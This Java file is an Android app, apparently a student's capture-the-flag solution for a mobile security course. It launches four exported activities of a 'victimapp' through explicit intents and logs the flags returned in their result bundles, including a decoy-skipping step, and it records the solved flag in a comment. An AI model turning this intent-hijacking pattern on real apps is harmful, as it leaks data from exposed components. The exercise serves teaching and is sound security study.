package com.example.maliciousapp;

import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;
import java.util.Set;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MOBIOTSEC";

    /**
     * resolve nested bundles
     *
     * @param extras  bundle object
     * @param prevKey previous key to concatenate the path of strings
     * @return String the FLAG contained in the last bundle
     */
    public String[] resolveBundle(Bundle extras, String prevKey) {
        Set<String> keys = extras.keySet();
        String key = keys.iterator().next();
        if (extras.get(key.toString()).toString().contains("Bundle")) { //IF contains a bundle we keep digging
            return resolveBundle(
                    extras.getBundle(key.toString()),
                    prevKey + "." + key.toString()
            );
        } else {
            String[] tmpS = {prevKey + "." + key.toString(), extras.get(key.toString()).toString()};
            return tmpS;
        }
    }

    ActivityResultLauncher<Intent> mStartForResult = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            new ActivityResultCallback<ActivityResult>() {

                @Override
                public void onActivityResult(ActivityResult result) {

                    if (result.getResultCode() == 1 || result.getResultCode() == 2) { // for part 1, 2 and 3
                        Intent intent = result.getData();
                        try {
                            //try to get all keys of bundle
                            Bundle extras = intent.getExtras();
                            for (String key : extras.keySet()) { //see akk the keys
                                Object value = extras.get(key);
                                Log.d(TAG, "Key: " + key + " - value :" + value.toString());
                            }
                        } catch (NullPointerException e) {
                            Log.d(TAG, "ERROR result Extras NullPointerException " + e);
                        } catch (Exception e) {
                            Log.d(TAG, "ERROR " + e.getMessage());
                        }

                    } else if (result.getResultCode() == 3) { //part 3 contains 2 flags => which we need just the second one
                        Intent intent = result.getData();
                        try {
                            //try to get all keys of bundle
                            Bundle extras = intent.getExtras();

                            String key = extras.keySet().iterator().next(); // skip the first fake flag
                            key = extras.keySet().iterator().next();

                            Object value = extras.get(key);
                            Log.d(TAG, "Key: " + key + " - value :" + value.toString());

                        } catch (NullPointerException e) {
                            Log.d(TAG, "ERROR result Extras NullPointerException " + e);
                        } catch (Exception e) {
                            Log.d(TAG, "ERROR " + e.getMessage());
                        }

                    } else { // part four
                        Intent intent = result.getData();
                        try {
                            Log.d(TAG, "res extras: " + intent.getExtras());
                            Bundle extras = intent.getExtras();

                            String[] flagFour = resolveBundle(intent.getExtras(), "");
                            Log.d(TAG, "FLAG FOUR KEYs [" + flagFour[0] + "] value: " + flagFour[1]);

                        } catch (Exception e) {
                            Log.d(TAG, "ERROR " + e.getMessage());
                        }
                    }
                }
            });

    protected void startMaliciousAttack() {

        String[] ActivityParts = {
                "com.example.victimapp.PartOne",
                "com.example.victimapp.PartTwo",
                "com.example.victimapp.PartThree",
                "com.example.victimapp.PartFour",
        };
        Log.d(TAG,"Flags will appear on screen from the last one to the first one: ");

        Intent maliciousIntent = new Intent(); // create a buffer intent
        for (String s : ActivityParts) {
            maliciousIntent.setComponent(new ComponentName("com.example.victimapp", s));

            //Attempt to attack the parth th
            try {
                Log.d(TAG, "Attacking activity: " + s);
                //TODO : CONCAT THE RESULTS
                // String finalFlag += mStartForResult.launch(maliciousIntent); //needs to return a string

                mStartForResult.launch(maliciousIntent);
            } catch (ActivityNotFoundException e) {
                Log.d(TAG, "ERROR : " + e.getMessage());
            }
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d(TAG, "MALICIOUS ACTIVITY STARTED");

        startMaliciousAttack();
        //FLAG{Gutta_cavat_lapidem_non_vi_sed_saepe_cadendo}
        //Alberto Morini + Marco Bellò

    }
}